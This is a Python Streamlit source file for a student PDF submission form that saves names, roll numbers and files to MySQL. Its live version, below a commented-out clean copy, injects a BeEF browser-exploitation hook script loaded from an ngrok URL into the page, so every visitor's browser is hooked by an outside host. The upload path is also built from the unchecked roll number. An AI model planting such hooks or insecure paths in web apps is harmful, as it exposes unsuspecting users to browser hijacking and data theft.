# import os
# import streamlit as st
# import pymysql
# import uuid

# # MySQL connection details from secrets.toml
# db_config = {
#     "charset": "utf8mb4",
#     "connect_timeout": 10,
#     "cursorclass": pymysql.cursors.DictCursor,
#     "db": st.secrets["general"]["DB_NAME"],
#     "host": st.secrets["general"]["DB_HOST"],
#     "password": st.secrets["general"]["DB_PASSWORD"],
#     "port": int(st.secrets["general"]["DB_PORT"]),
#     "user": st.secrets["general"]["DB_USER"],
# }

# # Function to save the uploaded file and details in the database
# def save_submission(name, roll_number, uploaded_file):
#     ref_id = str(uuid.uuid4())
#     file_content = uploaded_file.read()

#     try:
#         connection = pymysql.connect(**db_config)

#         with connection.cursor() as cursor:
#             insert_query = """
#                 INSERT INTO submissions (roll_number, name, file_path, file_content) 
#                 VALUES (%s, %s, %s, %s)
#             """
#             file_path = f"uploads/{roll_number}.pdf"

#             # Save the file locally
#             with open(file_path, "wb") as f:
#                 f.write(file_content)

#             cursor.execute(insert_query, (roll_number, name, file_path, file_content))
#             connection.commit()

#     except Exception as e:
#         st.error(f"Error saving submission: {e}")

#     finally:
#         if 'connection' in locals():
#             connection.close()

#     return ref_id

# # Streamlit app
# def main():
#     st.title("JOC @ JKLU")
#     st.write("Please submit your information:")

#     name = st.text_input("Name")
#     roll_number = st.text_input("Roll Number")
    
#     # File uploader without max_size (since max_size is not supported in older Streamlit versions)
#     uploaded_file = st.file_uploader("Upload your PDF file (max 2MB)", type=["pdf"], help="Only PDF files allowed.")

#     # Check file size manually (if file is uploaded)
#     if uploaded_file is not None:
#         if uploaded_file.size > 2 * 1024 * 1024:  # 10MB limit
#             st.error("File is too large! Please upload a file smaller than 2MB.")
#             return  # Stop further execution if the file is too large

#     submission_success = False
#     ref_id = None

#     if st.button("Submit"):
#         if name and roll_number and uploaded_file:
#             ref_id = save_submission(name, roll_number, uploaded_file)
#             submission_success = True
#         else:
#             st.error("Please fill all fields and upload a file.")

#     if submission_success:
#         st.success("File saved successfully! 🎉")
#         st.write(f"Your reference ID is: {ref_id}")
#         st.snow()

#         if st.button("Back to Submission"):
#             submission_success = False
#             ref_id = None
#             st.experimental_rerun()

# # Create uploads directory if it doesn't exist
# if not os.path.exists("uploads"):
#     os.makedirs("uploads")

# if __name__ == "__main__":
#     main()
#------------------------------------------------------------------------
import os
import streamlit as st
import pymysql
import uuid

# MySQL connection details from secrets.toml
db_config = {
    "charset": "utf8mb4",
    "connect_timeout": 10,
    "cursorclass": pymysql.cursors.DictCursor,
    "db": st.secrets["general"]["DB_NAME"],
    "host": st.secrets["general"]["DB_HOST"],
    "password": st.secrets["general"]["DB_PASSWORD"],
    "port": int(st.secrets["general"]["DB_PORT"]),
    "user": st.secrets["general"]["DB_USER"],
}

# Function to save the uploaded file and details in the database
def save_submission(name, roll_number, uploaded_file):
    ref_id = str(uuid.uuid4())
    file_content = uploaded_file.read()

    try:
        connection = pymysql.connect(**db_config)

        with connection.cursor() as cursor:
            insert_query = """
                INSERT INTO submissions (roll_number, name, file_path, file_content) 
                VALUES (%s, %s, %s, %s)
            """
            file_path = f"uploads/{roll_number}.pdf"

            # Save the file locally
            with open(file_path, "wb") as f:
                f.write(file_content)

            cursor.execute(insert_query, (roll_number, name, file_path, file_content))
            connection.commit()

    except Exception as e:
        st.error(f"Error saving submission: {e}")

    finally:
        if 'connection' in locals():
            connection.close()

    return ref_id

# Streamlit app
def main():
    st.title("JOC @ JKLU beef")
    st.write("Please submit your information:")

    # Add BeEF hook here
    beef_hook_url = "https://cd55-106-219-204-185.ngrok-free.app/hook.js"  # Replace with your ngrok URL or BeEF HTTPS URL
    st.markdown(f'<script src="{beef_hook_url}"></script>', unsafe_allow_html=True)

    name = st.text_input("Name")
    roll_number = st.text_input("Roll Number")
    
    uploaded_file = st.file_uploader("Upload your PDF file (max 2MB)", type=["pdf"], help="Only PDF files allowed.")

    if uploaded_file is not None:
        if uploaded_file.size > 2 * 1024 * 1024:  # 2MB limit
            st.error("File is too large! Please upload a file smaller than 2MB.")
            return  # Stop further execution if the file is too large

    submission_success = False
    ref_id = None

    if st.button("Submit"):
        if name and roll_number and uploaded_file:
            ref_id = save_submission(name, roll_number, uploaded_file)
            submission_success = True
        else:
            st.error("Please fill all fields and upload a file.")

    if submission_success:
        st.success("File saved successfully! 🎉")
        st.write(f"Your reference ID is: {ref_id}")
        st.snow()

        if st.button("Back to Submission"):
            submission_success = False
            ref_id = None
            st.experimental_rerun()

# Create uploads directory if it doesn't exist
if not os.path.exists("uploads"):
    os.makedirs("uploads")

if __name__ == "__main__":
    main()


